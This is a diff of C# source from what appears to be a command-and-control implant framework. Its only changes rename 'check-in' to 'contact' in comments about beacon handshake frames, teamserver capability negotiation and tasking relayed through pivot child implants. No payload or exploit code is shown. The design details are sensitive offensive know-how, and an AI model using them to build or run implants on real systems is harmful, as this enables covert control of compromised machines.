@@ -5,7 +5,7 @@ using Rod.V1;
 
 namespace Rod.Implant.Internal;
 
-// The frame shapes and the cycle vocabulary every check-in client shares.
+// The frame shapes and the cycle vocabulary every contact client shares.
 // Always compiled (the Chunking pattern): the transport modules that call it
 // trim independently per bake, so the shared plumbing lives outside their
 // files.
@@ -27,13 +27,13 @@ internal enum BeaconCycleResult
 }
 
 /// <summary>
-/// The frame constructors and input router shared by the check-in clients:
+/// The frame constructors and input router shared by the contact clients:
 /// one definition of the wire shapes, whichever transport carries them.
 /// </summary>
 internal static class BeaconFrames
 {
     /// <summary>
-    /// The handshake every check-in opens with: this implant's id, the
+    /// The handshake every contact opens with: this implant's id, the
     /// negotiated protocol version, and the advertised capability set -- the
     /// baked class verbs intersected with the compiled handlers
     /// (architecture.md Sec 5.3), so the teamserver only ever dispatches verbs
@@ -194,7 +194,7 @@ internal sealed class BeaconTasking(
     {
         // Fronted tasking (architecture.md Sec 5.2): a frame marked with
         // another implant's id is a Pivot child's tasking this stream executes
-        // on the child's behalf -- the child has no process to check in with.
+        // on the child's behalf -- the child has no process to contact with.
         // The gate is the fronted ledger: only a child this implant enrolled
         // is frontable, so tasking for any other implant is refused on the
         // task even when the signature verifies (the signature binds the
